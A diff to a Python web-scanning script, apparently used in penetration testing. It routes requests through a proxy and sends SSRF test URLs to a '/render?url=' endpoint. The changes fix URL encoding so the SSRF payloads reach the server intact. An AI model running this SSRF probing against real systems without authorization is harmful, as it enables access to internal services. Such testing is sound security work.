@@ -59,7 +59,7 @@ burp_requests = []
 for path, name, ext, auth in product(base_paths, file_names, extensions, auth_headers):
     if name.startswith("render?") and path != "/render":
         continue
-    full_path = path + name + ext if not name.startswith("render?") else f"/render?url={quote(name.split('=')[1])}"
+    full_path = path + name + ext if not name.startswith("render?") else f"/render?url={quote(name.split('=')[1], safe='')}"
     url = urljoin(base_url, full_path)
 
     headers = headers_base.copy()
@@ -185,11 +185,11 @@ for sw in swagger_paths:
 
 # === SSRF VECTOR CHECK ===
 for ssrf_url in ssrf_urls:
-    full_path = f"/render?url={quote(ssrf_url)}"
+    full_path = f"/render?url={quote(ssrf_url, safe='')}"
     try:
-        r = requests.get(base_url + full_path, headers=headers_base, proxies=proxies, verify=False, timeout=10)
+        r = requests.get(urljoin(base_url, full_path), headers=headers_base, proxies=proxies, verify=False, timeout=10)
         results.append({
-            "url": full_path,
+            "url": urljoin(base_url, full_path),
             "method": "GET",
             "status": r.status_code,
             "length": len(r.text),
